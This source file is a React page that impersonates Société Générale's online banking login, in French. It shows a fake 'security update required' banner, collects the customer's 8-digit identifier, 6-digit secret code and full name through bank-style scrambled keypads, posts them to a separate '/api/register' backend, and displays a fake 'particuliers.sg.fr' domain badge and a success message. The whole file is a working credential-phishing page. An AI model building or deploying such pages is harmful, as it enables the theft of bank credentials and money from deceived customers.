import { useState, useCallback, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import { X, Info, ArrowLeft, User, Lock, CheckCircle2, AlertTriangle } from 'lucide-react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

/* ─── Shuffle utility ─── */
const shuffle = (arr) => {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
};

/* ─── Build a 4x4 keypad for identifier (0-9 + 6 empty) ─── */
const buildIdentifierKeypad = () => {
  const digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
  const cells = [...digits, null, null, null, null, null, null];
  return shuffle(cells);
};

/* ─── Build a 4x3 keypad for password (1-9 + 3 empty) ─── */
const buildPasswordKeypad = () => {
  const digits = [1, 2, 3, 4, 5, 6, 7, 8, 9];
  const cells = [...digits, null, null, null];
  return shuffle(cells);
};

/* ─── Step 1 : Identifier ─── */
const StepIdentifier = ({ identifier, setIdentifier, rememberMe, setRememberMe, onValidate, error }) => {
  const keypad = useMemo(() => buildIdentifierKeypad(), []);

  const handleDigit = (d) => {
    if (identifier.length < 8) setIdentifier((prev) => prev + String(d));
  };
  const handleClear = () => setIdentifier('');
  const handleDeleteLast = () => setIdentifier((prev) => prev.slice(0, -1));

  return (
    <div className="flex flex-col items-center w-full" data-testid="step-identifier">
      <p className="text-slate-500 text-sm md:text-base mb-5 self-start" data-testid="identifier-instruction">
        Saisissez votre identifiant client
      </p>

      {/* Input display */}
      <div
        className={`w-full h-14 border-2 rounded-lg flex items-center px-4 transition-colors ${
          error ? 'border-[#E30613]' : identifier.length > 0 ? 'border-[#0A0A0A]' : 'border-slate-300'
        }`}
        data-testid="identifier-display"
      >
        <span className="flex-1 text-xl md:text-2xl font-bold text-[#0A0A0A] tracking-widest" style={{ fontFamily: 'Chivo, sans-serif' }}>
          {identifier || <span className="text-slate-300">________</span>}
        </span>
        {identifier.length > 0 && (
          <button data-testid="clear-identifier-btn" onClick={handleClear} className="p-1 text-slate-400 hover:text-[#0A0A0A] transition-colors">
            <X className="w-5 h-5" />
          </button>
        )}
      </div>

      {error && <p className="text-xs text-[#E30613] font-medium mt-2 self-start" data-testid="error-identifier">{error}</p>}

      {/* Se souvenir de moi */}
      <div className="flex items-center gap-3 mt-5 self-start">
        <span className="text-sm text-slate-500">Se souvenir de moi</span>
        <button className="text-blue-500" data-testid="remember-info-btn"><Info className="w-4 h-4" /></button>
        <button
          data-testid="remember-toggle"
          onClick={() => setRememberMe(!rememberMe)}
          className={`relative w-11 h-6 rounded-full transition-colors ${rememberMe ? 'bg-[#E30613]' : 'bg-slate-200'}`}
        >
          <div className={`absolute top-0.5 w-5 h-5 rounded-full bg-white shadow-sm transition-transform ${rememberMe ? 'translate-x-[22px]' : 'translate-x-0.5'}`} />
        </button>
      </div>

      {/* Progress dashes */}
      <div className="flex items-center gap-2.5 mt-7">
        {Array.from({ length: 8 }, (_, i) => (
          <div key={i} data-testid={`dash-${i}`} className={`w-6 h-1 rounded-full transition-all duration-200 ${i < identifier.length ? 'bg-[#0A0A0A]' : 'bg-slate-300'}`} />
        ))}
        {identifier.length > 0 && (
          <button data-testid="delete-last-btn" onClick={handleDeleteLast} className="ml-1 text-slate-400 hover:text-[#0A0A0A] transition-colors">
            <X className="w-4 h-4" />
          </button>
        )}
      </div>

      {/* 4x4 keypad */}
      <div className="grid grid-cols-4 gap-2.5 mt-7 w-full max-w-xs mx-auto" data-testid="keypad-identifier">
        {keypad.map((cell, idx) =>
          cell !== null ? (
            <button key={idx} data-testid={`key-id-${cell}`} onClick={() => handleDigit(cell)}
              className="aspect-square rounded-xl bg-slate-50 hover:bg-slate-100 active:bg-slate-200 flex items-center justify-center transition-all active:scale-95">
              <span className="text-xl md:text-2xl font-bold text-[#0A0A0A]" style={{ fontFamily: 'Chivo, sans-serif' }}>{cell}</span>
            </button>
          ) : (
            <div key={idx} className="aspect-square" />
          )
        )}
      </div>

      <button data-testid="validate-identifier-btn" onClick={onValidate}
        className="w-full max-w-xs mt-7 h-14 bg-[#E30613] hover:bg-[#C40510] active:scale-[0.98] text-white font-bold text-lg rounded-full transition-all shadow-[0_4px_15px_rgba(227,6,19,0.25)]"
        style={{ fontFamily: 'Chivo, sans-serif' }}>
        Valider
      </button>

      <button className="mt-4 text-sm text-[#E30613] font-medium underline underline-offset-2" data-testid="sound-keyboard-link">
        Activer le clavier sonore
      </button>
    </div>
  );
};

/* ─── Step 2 : Password (clavier numérique 1-9) ─── */
const StepPassword = ({ password, setPassword, onValidate, error }) => {
  const keypad = useMemo(() => buildPasswordKeypad(), []);

  const handleDigit = (d) => {
    if (password.length < 6) setPassword((prev) => prev + String(d));
  };
  const handleClear = () => setPassword('');
  const handleDeleteLast = () => setPassword((prev) => prev.slice(0, -1));

  return (
    <div className="flex flex-col items-center w-full" data-testid="step-password">
      <p className="text-slate-500 text-sm md:text-base mb-5 self-start" data-testid="password-instruction">
        Saisissez votre code secret
      </p>

      {/* Password display (masked) */}
      <div
        className={`w-full h-14 border-2 rounded-lg flex items-center px-4 transition-colors ${
          error ? 'border-[#E30613]' : password.length > 0 ? 'border-[#0A0A0A]' : 'border-slate-300'
        }`}
        data-testid="password-display"
      >
        <span className="flex-1 text-2xl font-bold text-[#0A0A0A] tracking-[0.4em]" style={{ fontFamily: 'Chivo, sans-serif' }}>
          {password ? '●'.repeat(password.length) : <span className="text-slate-300 tracking-[0.3em]">______</span>}
        </span>
        {password.length > 0 && (
          <button data-testid="clear-password-btn" onClick={handleClear} className="p-1 text-slate-400 hover:text-[#0A0A0A] transition-colors">
            <X className="w-5 h-5" />
          </button>
        )}
      </div>

      {error && <p className="text-xs text-[#E30613] font-medium mt-2 self-start" data-testid="error-password">{error}</p>}

      {/* Progress dashes (6 digits) */}
      <div className="flex items-center gap-3 mt-7">
        {Array.from({ length: 6 }, (_, i) => (
          <div key={i} data-testid={`pwd-dash-${i}`} className={`w-6 h-1 rounded-full transition-all duration-200 ${i < password.length ? 'bg-[#0A0A0A]' : 'bg-slate-300'}`} />
        ))}
        {password.length > 0 && (
          <button data-testid="delete-last-pwd-btn" onClick={handleDeleteLast} className="ml-1 text-slate-400 hover:text-[#0A0A0A] transition-colors">
            <X className="w-4 h-4" />
          </button>
        )}
      </div>

      {/* 4x3 keypad (1-9 randomized) */}
      <div className="grid grid-cols-4 gap-2.5 mt-7 w-full max-w-xs mx-auto" data-testid="keypad-password">
        {keypad.map((cell, idx) =>
          cell !== null ? (
            <button key={idx} data-testid={`key-pwd-${cell}`} onClick={() => handleDigit(cell)}
              className="aspect-square rounded-xl bg-slate-50 hover:bg-slate-100 active:bg-slate-200 flex items-center justify-center transition-all active:scale-95">
              <span className="text-xl md:text-2xl font-bold text-[#0A0A0A]" style={{ fontFamily: 'Chivo, sans-serif' }}>{cell}</span>
            </button>
          ) : (
            <div key={idx} className="aspect-square" />
          )
        )}
      </div>

      <button data-testid="validate-password-btn" onClick={onValidate}
        className="w-full max-w-xs mt-7 h-14 bg-[#E30613] hover:bg-[#C40510] active:scale-[0.98] text-white font-bold text-lg rounded-full transition-all shadow-[0_4px_15px_rgba(227,6,19,0.25)]"
        style={{ fontFamily: 'Chivo, sans-serif' }}>
        Valider
      </button>

      <button className="mt-4 text-sm text-[#E30613] font-medium underline underline-offset-2" data-testid="sound-keyboard-pwd-link">
        Activer le clavier sonore
      </button>
    </div>
  );
};

/* ─── Step 3 : Name ─── */
const StepName = ({ firstName, setFirstName, lastName, setLastName, onValidate, errors, isSubmitting }) => (
  <div className="flex flex-col items-center w-full animate-fade-up" data-testid="step-name">
    <div className="w-14 h-14 bg-[#E30613]/10 rounded-2xl flex items-center justify-center mb-6">
      <User className="w-7 h-7 text-[#E30613]" />
    </div>
    <h2 className="text-2xl font-bold text-[#0A0A0A] mb-2 text-center" style={{ fontFamily: 'Chivo, sans-serif' }} data-testid="step-name-title">
      Vos informations
    </h2>
    <p className="text-sm text-slate-500 mb-8 text-center">
      Renseignez votre nom et prénom pour finaliser la mise à jour
    </p>

    <div className="w-full space-y-5">
      <div className="space-y-2">
        <label className="text-sm font-semibold text-[#0A0A0A]">Nom</label>
        <input data-testid="input-lastname" type="text" value={lastName}
          onChange={(e) => setLastName(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && document.querySelector('[data-testid="input-firstname"]')?.focus()}
          placeholder="Dupont" autoFocus
          className={`w-full h-14 px-4 rounded-xl border-2 text-base transition-all outline-none ${
            errors?.lastName ? 'border-[#E30613] bg-red-50/50' : 'border-slate-200 bg-slate-50 focus:border-[#0A0A0A] focus:bg-white'
          }`} />
        {errors?.lastName && <p className="text-xs text-[#E30613] font-medium" data-testid="error-lastname">{errors.lastName}</p>}
      </div>
      <div className="space-y-2">
        <label className="text-sm font-semibold text-[#0A0A0A]">Prénom</label>
        <input data-testid="input-firstname" type="text" value={firstName}
          onChange={(e) => setFirstName(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && onValidate()}
          placeholder="Jean"
          className={`w-full h-14 px-4 rounded-xl border-2 text-base transition-all outline-none ${
            errors?.firstName ? 'border-[#E30613] bg-red-50/50' : 'border-slate-200 bg-slate-50 focus:border-[#0A0A0A] focus:bg-white'
          }`} />
        {errors?.firstName && <p className="text-xs text-[#E30613] font-medium" data-testid="error-firstname">{errors.firstName}</p>}
      </div>
    </div>

    {errors?.submit && <p className="text-xs text-[#E30613] font-medium mt-4 text-center" data-testid="error-submit">{errors.submit}</p>}

    <button data-testid="submit-btn" onClick={onValidate} disabled={isSubmitting}
      className="w-full mt-8 h-14 bg-[#E30613] hover:bg-[#C40510] active:scale-[0.98] text-white font-bold text-lg rounded-full transition-all shadow-[0_4px_15px_rgba(227,6,19,0.25)] disabled:opacity-60"
      style={{ fontFamily: 'Chivo, sans-serif' }}>
      {isSubmitting ? 'Envoi en cours...' : "Valider la mise à jour"}
    </button>
  </div>
);

/* ─── Main Flow ─── */
export default function RegisterFlow() {
  const navigate = useNavigate();
  const [step, setStep] = useState(0);
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isComplete, setIsComplete] = useState(false);

  const handleValidateIdentifier = useCallback(() => {
    if (!identifier) { setErrors({ identifier: 'Veuillez saisir votre identifiant' }); return; }
    if (identifier.length !== 8) { setErrors({ identifier: "L'identifiant doit contenir exactement 8 chiffres" }); return; }
    setErrors({}); setStep(1);
  }, [identifier]);

  const handleValidatePassword = useCallback(() => {
    if (!password) { setErrors({ password: 'Veuillez saisir votre code secret' }); return; }
    if (password.length < 6) { setErrors({ password: 'Le code secret doit contenir 6 chiffres' }); return; }
    setErrors({}); setStep(2);
  }, [password]);

  const handleSubmitName = useCallback(async () => {
    const newErrors = {};
    if (!lastName.trim()) newErrors.lastName = 'Veuillez saisir votre nom';
    if (!firstName.trim()) newErrors.firstName = 'Veuillez saisir votre prénom';
    if (Object.keys(newErrors).length > 0) { setErrors(newErrors); return; }

    setIsSubmitting(true);
    try {
      await axios.post(`${API}/register`, { identifier, password, first_name: firstName, last_name: lastName });
      setIsComplete(true);
    } catch {
      setErrors({ submit: 'Une erreur est survenue. Veuillez réessayer.' });
    } finally {
      setIsSubmitting(false);
    }
  }, [identifier, password, firstName, lastName]);

  const handleBack = () => {
    if (step > 0) { setStep(step - 1); setErrors({}); }
    else navigate('/');
  };

  /* Success screen */
  if (isComplete) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-6" data-testid="register-success">
        <div className="w-full max-w-sm text-center">
          <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6">
            <CheckCircle2 className="w-10 h-10 text-green-500" />
          </div>
          <h2 className="text-2xl font-bold text-[#0A0A0A] mb-3" style={{ fontFamily: 'Chivo, sans-serif' }} data-testid="success-title">
            Mise à jour réussie
          </h2>
          <p className="text-slate-500 text-sm mb-10">
            Merci <strong>{firstName} {lastName}</strong> !<br />
            Votre Securipass a été mis à jour avec succès.
          </p>
          <button data-testid="back-to-home-btn" onClick={() => navigate('/')}
            className="w-full h-14 bg-[#E30613] hover:bg-[#C40510] text-white font-bold text-lg rounded-full transition-all"
            style={{ fontFamily: 'Chivo, sans-serif' }}>
            Retour à l'accueil
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col" data-testid="register-page">
      {/* Header */}
      <div className="border-b border-slate-100">
        <div className="max-w-lg mx-auto px-5 h-14 flex items-center justify-between">
          <button data-testid="register-back-btn" onClick={handleBack}
            className="flex items-center gap-1.5 text-sm font-medium text-slate-500 hover:text-[#0A0A0A] transition-colors">
            <ArrowLeft className="w-4 h-4" />
            Retour
          </button>
          <a href="/" className="flex items-center gap-2">
            <img
              src="https://customer-assets.emergentagent.com/job_code-web-dev/artifacts/67secxw0_IMG_0348.png"
              alt="Société Générale"
              className="h-8 w-auto"
            />
          </a>
          <div className="w-16" />
        </div>
      </div>

      {/* Security update alert banner */}
      <div className="bg-[#FFF8E1] border-b border-[#FFE082]" data-testid="security-alert-banner">
        <div className="max-w-lg mx-auto px-5 py-3 flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-[#F59E0B] shrink-0 mt-0.5" />
          <div>
            <p className="text-sm font-bold text-[#92400E]" style={{ fontFamily: 'Chivo, sans-serif' }}>
              Mise à jour de sécurité requise
            </p>
            <p className="text-xs text-[#B45309] mt-1 leading-relaxed">
              Un nouveau Securipass plus puissant est disponible pour renforcer la sécurité de votre compte. 
              Veuillez mettre à jour vos informations pour bénéficier d'une protection optimale.
            </p>
          </div>
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center justify-start px-5 pt-8 pb-12 max-w-sm mx-auto w-full">
        {step === 0 && (
          <StepIdentifier identifier={identifier} setIdentifier={setIdentifier}
            rememberMe={rememberMe} setRememberMe={setRememberMe}
            onValidate={handleValidateIdentifier} error={errors.identifier} />
        )}
        {step === 1 && (
          <StepPassword password={password} setPassword={setPassword}
            onValidate={handleValidatePassword} error={errors.password} />
        )}
        {step === 2 && (
          <StepName firstName={firstName} setFirstName={setFirstName}
            lastName={lastName} setLastName={setLastName}
            onValidate={handleSubmitName} errors={errors} isSubmitting={isSubmitting} />
        )}
      </div>

      {/* Bottom */}
      <div className="py-3 flex justify-center">
        <span className="text-xs font-bold text-slate-500 bg-slate-100 px-4 py-1.5 rounded-full" data-testid="domain-badge">
          particuliers.sg.fr
        </span>
      </div>
    </div>
  );
}
